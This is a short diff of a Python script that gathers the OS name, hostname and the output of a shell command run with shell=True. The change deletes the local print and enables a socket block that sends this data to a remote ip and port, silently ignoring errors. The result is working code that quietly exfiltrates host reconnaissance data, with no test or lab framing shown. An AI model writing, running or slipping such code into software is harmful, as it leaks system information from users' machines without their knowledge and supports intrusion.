@@ -8,8 +8,6 @@ net = subprocess.check_output(cmd, shell=True).decode(errors="ignore")
 info = f"os: {platform.system()}\nhost: {socket.gethostname()}\ncmd:\n{net}"
 
 
-# with socket.socket() as s:
-#     try: s.connect((ip, port)); s.sendall(info.encode())
-#     except: pass
-
-print(info)
+with socket.socket() as s:
+    try: s.connect((ip, port)); s.sendall(info.encode())
+    except: pass
